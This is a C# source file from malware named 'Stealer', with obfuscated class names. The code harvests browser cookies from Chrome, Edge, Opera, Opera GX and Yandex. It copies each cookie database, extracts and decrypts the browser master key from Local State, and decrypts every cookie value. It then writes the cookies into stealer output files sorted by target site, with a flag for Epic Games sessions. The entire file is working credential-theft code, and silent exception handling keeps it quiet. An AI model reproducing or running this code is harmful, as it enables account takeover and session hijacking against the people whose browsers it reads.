using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace Stealer;

internal class tBBjEnntmoNlKq
{
	private class PassData
	{
		public string Url { get; set; }

		public string Login { get; set; }

		public string Password { get; set; }
	}

	public static int count = 0;

	public static bool epicgames = false;

	public static List<Thread> threads = new List<Thread>();

	public static void start()
	{
		Stopwatch stopwatch = Stopwatch.StartNew();
		Thread thread = new Thread((ThreadStart)delegate
		{
			getOpera();
		});
		Thread thread2 = new Thread((ThreadStart)delegate
		{
			getChrome();
		});
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			getEdge();
		});
		Thread thread4 = new Thread((ThreadStart)delegate
		{
			getYand();
		});
		Thread thread5 = new Thread((ThreadStart)delegate
		{
			bGNskvyyGANfxD.getcookie();
		});
		thread.Start();
		thread2.Start();
		thread3.Start();
		thread4.Start();
		thread5.Start();
		thread.Join();
		thread2.Join();
		thread3.Join();
		thread4.Join();
		thread5.Join();
		stopwatch.Stop();
		TimeSpan elapsed = stopwatch.Elapsed;
		cDFkBrvXKxXwYB.elapsedCookies = $"{elapsed.Hours:00}:{elapsed.Minutes:00}:{elapsed.Seconds:00}.{elapsed.Milliseconds:000}";
	}

	public static void getYand()
	{
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies"))
			{
				return;
			}
			string result = "";
			string text = "Yandex";
			string sourceFileName = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies";
			string text2 = Path.GetTempPath() + "\\bdyandcookie.tmp";
			if (File.Exists(text2))
			{
				File.Delete(text2);
			}
			File.Copy(sourceFileName, text2);
			SqlHandler sqlHandler = new SqlHandler(text2);
			sqlHandler.ReadTable("cookies");
			int rowCount = sqlHandler.GetRowCount();
			int rowNum;
			for (rowNum = 0; rowNum < rowCount; rowNum++)
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						string text3 = Crypto.EasyDecrypt(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies", sqlHandler.GetValue(rowNum, 12));
						try
						{
							string value = sqlHandler.GetValue(rowNum, 1);
							string value2 = sqlHandler.GetValue(rowNum, 2);
							string value3 = sqlHandler.GetValue(rowNum, 4);
							string value4 = sqlHandler.GetValue(rowNum, 5);
							string value5 = sqlHandler.GetValue(rowNum, 6);
							if (value.Contains("epicgames"))
							{
								epicgames = true;
							}
							string[] sites = LhEWYGmwhOEoYt.sites;
							foreach (string text4 in sites)
							{
								if (value.Contains(text4))
								{
									if (!Directory.Exists(Help.path_stealer + "Browsers\\Cookies\\Sites"))
									{
										Directory.CreateDirectory(Help.path_stealer + "Browsers\\Cookies\\Sites");
									}
									else
									{
										File.AppendAllText(Help.path_stealer + "Browsers\\Cookies\\Sites\\[" + text4 + "][cookie].txt", $"{value}\tFALSE\t{value3}\t{value5.ToUpper()}\t{value4}\t{value2}\t{text3}\n");
									}
								}
							}
							result += $"{value}\tFALSE\t{value3}\t{value5.ToUpper()}\t{value4}\t{value2}\t{text3}\n";
							count++;
						}
						catch (Exception)
						{
						}
					}
					catch
					{
					}
				});
				cDFkBrvXKxXwYB.threads.Add(thread);
				thread.Start();
			}
			if (File.Exists(text2))
			{
				File.Delete(text2);
			}
			if (result != "")
			{
				File.WriteAllText(Help.path_stealer + "Browsers\\Cookies\\[" + text + "][cookie].txt", result);
			}
			count++;
		}
		catch
		{
		}
	}

	public static void getOperaGX()
	{
		try
		{
			string result = "";
			string text = "Opera GX";
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\Cookies";
			string sourceFileName = text2 + "\\..\\Local State";
			string text3 = Path.GetTempPath() + "\\bdoperagxcookie.tmp";
			string text4 = Path.GetTempPath() + "\\lsoperagxcookie.tmp";
			if (File.Exists(text3))
			{
				File.Delete(text3);
			}
			if (File.Exists(text4))
			{
				File.Delete(text4);
			}
			File.Copy(text2, text3);
			File.Copy(sourceFileName, text4);
			SqlHandler sqlHandler = new SqlHandler(text3);
			new List<PassData>();
			sqlHandler.ReadTable("cookies");
			string text5 = File.ReadAllText(text4);
			string[] array = Regex.Split(text5, "\"");
			int num = 0;
			string[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				if (!(array2[i] == "encrypted_key"))
				{
					num++;
					continue;
				}
				text5 = array[num + 2];
				break;
			}
			byte[] bytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text5)).Remove(0, 5));
			byte[] masterKeyBytes = DecryptAPI.DecryptBrowsers(bytes);
			int rowCount = sqlHandler.GetRowCount();
			int rowNum;
			for (rowNum = 0; rowNum < rowCount; rowNum++)
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						string value = sqlHandler.GetValue(rowNum, 12);
						byte[] bytes2 = Encoding.Default.GetBytes(value);
						string text6 = "";
						try
						{
							if (value.StartsWith("v10"))
							{
								byte[] iv = bytes2.Skip(3).Take(12).ToArray();
								text6 = AesGcm256.Decrypt(bytes2.Skip(15).ToArray(), masterKeyBytes, iv);
							}
							else
							{
								text6 = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes2));
							}
							string value2 = sqlHandler.GetValue(rowNum, 1);
							string value3 = sqlHandler.GetValue(rowNum, 2);
							string value4 = sqlHandler.GetValue(rowNum, 4);
							string value5 = sqlHandler.GetValue(rowNum, 5);
							string value6 = sqlHandler.GetValue(rowNum, 6);
							if (value2.Contains("epicgames"))
							{
								epicgames = true;
							}
							string[] sites = LhEWYGmwhOEoYt.sites;
							foreach (string text7 in sites)
							{
								if (value2.Contains(text7))
								{
									if (!Directory.Exists(Help.path_stealer + "Browsers\\Cookies\\Sites"))
									{
										Directory.CreateDirectory(Help.path_stealer + "Browsers\\Cookies\\Sites");
									}
									else
									{
										File.AppendAllText(Help.path_stealer + "Browsers\\Cookies\\Sites\\[" + text7 + "][cookie].txt", $"{value2}\tFALSE\t{value4}\t{value6.ToUpper()}\t{value5}\t{value3}\t{text6}\n");
									}
								}
							}
							result += $"{value2}\tFALSE\t{value4}\t{value6.ToUpper()}\t{value5}\t{value3}\t{text6}\n";
							count++;
						}
						catch
						{
						}
					}
					catch
					{
					}
				});
				cDFkBrvXKxXwYB.threads.Add(thread);
				thread.Start();
			}
			if (File.Exists(text3))
			{
				File.Delete(text3);
			}
			if (File.Exists(text4))
			{
				File.Delete(text4);
			}
			if (result != "")
			{
				File.WriteAllText(Help.path_stealer + "Browsers\\Cookies\\[" + text + "][cookie].txt", result);
			}
		}
		catch
		{
		}
	}

	public static void getOpera()
	{
		try
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\Cookies"))
				{
					getOperaGX();
				}
			});
			Thread thread2 = new Thread((ThreadStart)delegate
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Cookies"))
				{
					string result = "";
					string text = "Opera";
					string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Cookies";
					string sourceFileName = text2 + "\\..\\Local State";
					string text3 = Path.GetTempPath() + "\\bdoperacookie.tmp";
					string text4 = Path.GetTempPath() + "\\lsoperacookie.tmp";
					if (File.Exists(text3))
					{
						File.Delete(text3);
					}
					if (File.Exists(text4))
					{
						File.Delete(text4);
					}
					File.Copy(text2, text3);
					File.Copy(sourceFileName, text4);
					SqlHandler sqlHandler = new SqlHandler(text3);
					new List<PassData>();
					sqlHandler.ReadTable("cookies");
					string text5 = File.ReadAllText(text4);
					string[] array = Regex.Split(text5, "\"");
					int num = 0;
					string[] array2 = array;
					for (int i = 0; i < array2.Length; i++)
					{
						if (array2[i] == "encrypted_key")
						{
							text5 = array[num + 2];
							break;
						}
						num++;
					}
					byte[] bytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text5)).Remove(0, 5));
					byte[] masterKeyBytes = DecryptAPI.DecryptBrowsers(bytes);
					int rowCount = sqlHandler.GetRowCount();
					int rowNum;
					for (rowNum = 0; rowNum < rowCount; rowNum++)
					{
						Thread thread3 = new Thread((ThreadStart)delegate
						{
							try
							{
								string value = sqlHandler.GetValue(rowNum, 12);
								byte[] bytes2 = Encoding.Default.GetBytes(value);
								string text6 = "";
								try
								{
									if (value.StartsWith("v10"))
									{
										byte[] iv = bytes2.Skip(3).Take(12).ToArray();
										text6 = AesGcm256.Decrypt(bytes2.Skip(15).ToArray(), masterKeyBytes, iv);
									}
									else
									{
										text6 = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes2));
									}
									string value2 = sqlHandler.GetValue(rowNum, 1);
									string value3 = sqlHandler.GetValue(rowNum, 2);
									string value4 = sqlHandler.GetValue(rowNum, 4);
									string value5 = sqlHandler.GetValue(rowNum, 5);
									string value6 = sqlHandler.GetValue(rowNum, 6);
									if (value2.Contains("epicgames"))
									{
										epicgames = true;
									}
									string[] sites = LhEWYGmwhOEoYt.sites;
									foreach (string text7 in sites)
									{
										if (value2.Contains(text7))
										{
											if (!Directory.Exists(Help.path_stealer + "Browsers\\Cookies\\Sites"))
											{
												Directory.CreateDirectory(Help.path_stealer + "Browsers\\Cookies\\Sites");
											}
											else
											{
												File.AppendAllText(Help.path_stealer + "Browsers\\Cookies\\Sites\\[" + text7 + "][cookie].txt", $"{value2}\tFALSE\t{value4}\t{value6.ToUpper()}\t{value5}\t{value3}\t{text6}\n");
											}
										}
									}
									result += $"{value2}\tFALSE\t{value4}\t{value6.ToUpper()}\t{value5}\t{value3}\t{text6}\n";
									count++;
								}
								catch
								{
								}
							}
							catch
							{
							}
						});
						cDFkBrvXKxXwYB.threads.Add(thread3);
						thread3.Start();
					}
					if (File.Exists(text3))
					{
						File.Delete(text3);
					}
					if (File.Exists(text4))
					{
						File.Delete(text4);
					}
					if (result != "")
					{
						File.WriteAllText(Help.path_stealer + "Browsers\\Cookies\\[" + text + "][cookie].txt", result);
					}
				}
			});
			thread.Start();
			thread2.Start();
			thread.Join();
			thread2.Join();
		}
		catch
		{
		}
	}

	public static void getChrome86()
	{
		try
		{
			string result = "";
			string text = "Chrome2";
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google(x86)\\Chrome\\User Data\\Default\\Cookies";
			string sourceFileName = text2 + "\\..\\..\\Local State";
			string text3 = Path.GetTempPath() + "\\bdchrome86cookie.tmp";
			string text4 = Path.GetTempPath() + "\\lschrome86cookie.tmp";
			if (File.Exists(text3))
			{
				File.Delete(text3);
			}
			if (File.Exists(text4))
			{
				File.Delete(text4);
			}
			File.Copy(text2, text3);
			File.Copy(sourceFileName, text4);
			SqlHandler sqlHandler = new SqlHandler(text3);
			new List<PassData>();
			sqlHandler.ReadTable("cookies");
			string text5 = File.ReadAllText(text4);
			string[] array = Regex.Split(text5, "\"");
			int num = 0;
			string[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				if (!(array2[i] == "encrypted_key"))
				{
					num++;
					continue;
				}
				text5 = array[num + 2];
				break;
			}
			byte[] bytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text5)).Remove(0, 5));
			byte[] masterKeyBytes = DecryptAPI.DecryptBrowsers(bytes);
			int rowCount = sqlHandler.GetRowCount();
			int rowNum;
			for (rowNum = 0; rowNum < rowCount; rowNum++)
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						string value = sqlHandler.GetValue(rowNum, 12);
						byte[] bytes2 = Encoding.Default.GetBytes(value);
						string text6 = "";
						try
						{
							if (value.StartsWith("v10"))
							{
								byte[] iv = bytes2.Skip(3).Take(12).ToArray();
								text6 = AesGcm256.Decrypt(bytes2.Skip(15).ToArray(), masterKeyBytes, iv);
							}
							else
							{
								text6 = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes2));
							}
							string value2 = sqlHandler.GetValue(rowNum, 1);
							string value3 = sqlHandler.GetValue(rowNum, 2);
							string value4 = sqlHandler.GetValue(rowNum, 4);
							string value5 = sqlHandler.GetValue(rowNum, 5);
							string value6 = sqlHandler.GetValue(rowNum, 6);
							if (value2.Contains("epicgames"))
							{
								epicgames = true;
							}
							string[] sites = LhEWYGmwhOEoYt.sites;
							foreach (string text7 in sites)
							{
								if (value2.Contains(text7))
								{
									if (!Directory.Exists(Help.path_stealer + "Browsers\\Cookies\\Sites"))
									{
										Directory.CreateDirectory(Help.path_stealer + "Browsers\\Cookies\\Sites");
									}
									else
									{
										File.AppendAllText(Help.path_stealer + "Browsers\\Cookies\\Sites\\[" + text7 + "][cookie].txt", $"{value2}\tFALSE\t{value4}\t{value6.ToUpper()}\t{value5}\t{value3}\t{text6}\n");
									}
								}
							}
							result += $"{value2}\tFALSE\t{value4}\t{value6.ToUpper()}\t{value5}\t{value3}\t{text6}\n";
							count++;
						}
						catch
						{
						}
					}
					catch
					{
					}
				});
				cDFkBrvXKxXwYB.threads.Add(thread);
				thread.Start();
			}
			if (File.Exists(text3))
			{
				File.Delete(text3);
			}
			if (File.Exists(text4))
			{
				File.Delete(text4);
			}
			if (result != "")
			{
				File.WriteAllText(Help.path_stealer + "Browsers\\Cookies\\[" + text + "][cookie].txt", result);
			}
		}
		catch
		{
		}
	}

	public static void getChrome()
	{
		try
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google(x86)\\Chrome\\User Data\\Default\\Cookies"))
				{
					getChrome86();
				}
			});
			string result;
			SqlHandler sqlHandler;
			byte[] masterKeyBytes;
			int rowNum;
			Thread thread2 = new Thread((ThreadStart)delegate
			{
				try
				{
					if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Cookies"))
					{
						result = "";
						string text = "Chrome";
						string text2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Cookies";
						string sourceFileName = text2 + "\\..\\..\\Local State";
						string text3 = Path.GetTempPath() + "\\bdchromecookie.tmp";
						string text4 = Path.GetTempPath() + "\\lschromecookie.tmp";
						if (File.Exists(text3))
						{
							File.Delete(text3);
						}
						if (File.Exists(text4))
						{
							File.Delete(text4);
						}
						File.Copy(text2, text3);
						File.Copy(sourceFileName, text4);
						sqlHandler = new SqlHandler(text3);
						new List<PassData>();
						sqlHandler.ReadTable("cookies");
						string text5 = File.ReadAllText(text4);
						string[] array = Regex.Split(text5, "\"");
						int num = 0;
						string[] array2 = array;
						for (int i = 0; i < array2.Length; i++)
						{
							if (array2[i] == "encrypted_key")
							{
								text5 = array[num + 2];
								break;
							}
							num++;
						}
						byte[] bytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text5)).Remove(0, 5));
						masterKeyBytes = DecryptAPI.DecryptBrowsers(bytes);
						int rowCount = sqlHandler.GetRowCount();
						for (rowNum = 0; rowNum < rowCount; rowNum++)
						{
							Thread thread3 = new Thread((ThreadStart)delegate
							{
								try
								{
									string value = sqlHandler.GetValue(rowNum, 12);
									byte[] bytes2 = Encoding.Default.GetBytes(value);
									string text6 = "";
									try
									{
										if (value.StartsWith("v10"))
										{
											byte[] iv = bytes2.Skip(3).Take(12).ToArray();
											text6 = AesGcm256.Decrypt(bytes2.Skip(15).ToArray(), masterKeyBytes, iv);
										}
										else
										{
											text6 = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes2));
										}
										string value2 = sqlHandler.GetValue(rowNum, 1);
										string value3 = sqlHandler.GetValue(rowNum, 2);
										string value4 = sqlHandler.GetValue(rowNum, 4);
										string value5 = sqlHandler.GetValue(rowNum, 5);
										string value6 = sqlHandler.GetValue(rowNum, 6);
										if (value2.Contains("epicgames"))
										{
											epicgames = true;
										}
										string[] sites = LhEWYGmwhOEoYt.sites;
										foreach (string text7 in sites)
										{
											if (value2.Contains(text7))
											{
												if (!Directory.Exists(Help.path_stealer + "Browsers\\Cookies\\Sites"))
												{
													Directory.CreateDirectory(Help.path_stealer + "Browsers\\Cookies\\Sites");
												}
												else
												{
													File.AppendAllText(Help.path_stealer + "Browsers\\Cookies\\Sites\\[" + text7 + "][cookie].txt", $"{value2}\tFALSE\t{value4}\t{value6.ToUpper()}\t{value5}\t{value3}\t{text6}\n");
												}
											}
										}
										result += $"{value2}\tFALSE\t{value4}\t{value6.ToUpper()}\t{value5}\t{value3}\t{text6}\n";
										count++;
									}
									catch
									{
									}
								}
								catch
								{
								}
							});
							cDFkBrvXKxXwYB.threads.Add(thread3);
							thread3.Start();
						}
						if (File.Exists(text3))
						{
							File.Delete(text3);
						}
						if (File.Exists(text4))
						{
							File.Delete(text4);
						}
						if (result != "")
						{
							File.WriteAllText(Help.path_stealer + "Browsers\\Cookies\\[" + text + "][cookie].txt", result);
						}
					}
				}
				catch
				{
				}
			});
			thread.Start();
			thread2.Start();
			thread.Join();
			thread2.Join();
		}
		catch
		{
		}
	}

	public static void getEdge()
	{
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Cookies"))
			{
				return;
			}
			string result = "";
			string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Cookies";
			string sourceFileName = text + "\\..\\..\\Local State";
			string text2 = Path.GetTempPath() + "\\bdedgecook.tmp";
			string text3 = Path.GetTempPath() + "\\lsedgecook.tmp";
			if (File.Exists(text2))
			{
				File.Delete(text2);
			}
			if (File.Exists(text3))
			{
				File.Delete(text3);
			}
			File.Copy(text, text2);
			File.Copy(sourceFileName, text3);
			SqlHandler sqlHandler = new SqlHandler(text2);
			new List<PassData>();
			sqlHandler.ReadTable("cookies");
			string text4 = File.ReadAllText(text3);
			string[] array = Regex.Split(text4, "\"");
			int num = 0;
			string[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				if (!(array2[i] == "encrypted_key"))
				{
					num++;
					continue;
				}
				text4 = array[num + 2];
				break;
			}
			byte[] bytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text4)).Remove(0, 5));
			byte[] masterKeyBytes = DecryptAPI.DecryptBrowsers(bytes);
			int rowCount = sqlHandler.GetRowCount();
			int rowNum;
			for (rowNum = 0; rowNum < rowCount; rowNum++)
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						string value = sqlHandler.GetValue(rowNum, 12);
						byte[] bytes2 = Encoding.Default.GetBytes(value);
						string text5 = "";
						try
						{
							if (value.StartsWith("v10"))
							{
								byte[] iv = bytes2.Skip(3).Take(12).ToArray();
								text5 = AesGcm256.Decrypt(bytes2.Skip(15).ToArray(), masterKeyBytes, iv);
							}
							else
							{
								text5 = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes2));
							}
							string value2 = sqlHandler.GetValue(rowNum, 1);
							string value3 = sqlHandler.GetValue(rowNum, 2);
							string value4 = sqlHandler.GetValue(rowNum, 4);
							string value5 = sqlHandler.GetValue(rowNum, 5);
							string value6 = sqlHandler.GetValue(rowNum, 6);
							if (value2.Contains("epicgames"))
							{
								epicgames = true;
							}
							string[] sites = LhEWYGmwhOEoYt.sites;
							foreach (string text6 in sites)
							{
								if (value2.Contains(text6))
								{
									if (!Directory.Exists(Help.path_stealer + "Browsers\\Cookies\\Sites"))
									{
										Directory.CreateDirectory(Help.path_stealer + "Browsers\\Cookies\\Sites");
									}
									else
									{
										File.AppendAllText(Help.path_stealer + "Browsers\\Cookies\\Sites\\[" + text6 + "][cookie].txt", $"{value2}\tFALSE\t{value4}\t{value6.ToUpper()}\t{value5}\t{value3}\t{text5}\n");
									}
								}
							}
							result += $"{value2}\tFALSE\t{value4}\t{value6.ToUpper()}\t{value5}\t{value3}\t{text5}\n";
							count++;
						}
						catch
						{
						}
					}
					catch
					{
					}
				});
				cDFkBrvXKxXwYB.threads.Add(thread);
				thread.Start();
			}
			if (File.Exists(text2))
			{
				File.Delete(text2);
			}
			if (File.Exists(text3))
			{
				File.Delete(text3);
			}
			if (result != "")
			{
				File.WriteAllText(Help.path_stealer + "Browsers\\Cookies\\[Edge][cookie].txt", result);
			}
		}
		catch
		{
		}
	}
}
